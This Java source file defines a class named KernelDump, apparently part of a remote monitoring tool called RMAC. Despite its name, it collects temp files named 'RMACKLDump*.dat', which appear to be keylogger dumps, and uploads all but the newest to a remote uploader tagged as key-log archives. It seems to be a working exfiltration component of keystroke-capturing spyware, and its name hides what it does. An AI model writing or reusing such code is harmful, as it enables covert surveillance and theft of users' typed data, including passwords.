package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class KernelDump {

  public Thread thread;

  public KernelDump() {
    this.thread = new Thread(this::run, "KernelDump");
  }

  public void start() {
    this.thread.start();
  }

  public void run() {
    List<Path> dumps = this.getAllLogFiles(Constants.SYS_TEMP_LOCATION);
    dumps.forEach(
        dump -> RMAC.uploader.uploadFile(dump.toAbsolutePath().toString(), ArchiveFileType.KEY));
  }

  public List<Path> getAllLogFiles(String dirPath) {
    List<Path> dumps = new ArrayList<>();

    try {
      Path[] logFiles = RMAC.fs
          .list(dirPath)
          .filter(path ->
              path.getFileName().toString().endsWith(".dat") &&
                  path.getFileName().toString().startsWith("RMACKLDump")
          )
          .toArray(Path[]::new);

      long newestModified = Long.MIN_VALUE;
      Path newestFile = null;
      for (Path f : logFiles) {
        long time = RMAC.fs.getLastModified(f.toAbsolutePath().toString());
        if (time > newestModified) {
          newestModified = time;
          newestFile = f;
        }
      }

      for (Path f : logFiles) {
        if (f != newestFile) {
          dumps.add(f);
        }
      }
    } catch (IOException e) {
      log.error("Could not get RMAC kernel dumps", e);
    }

    return dumps;
  }
}
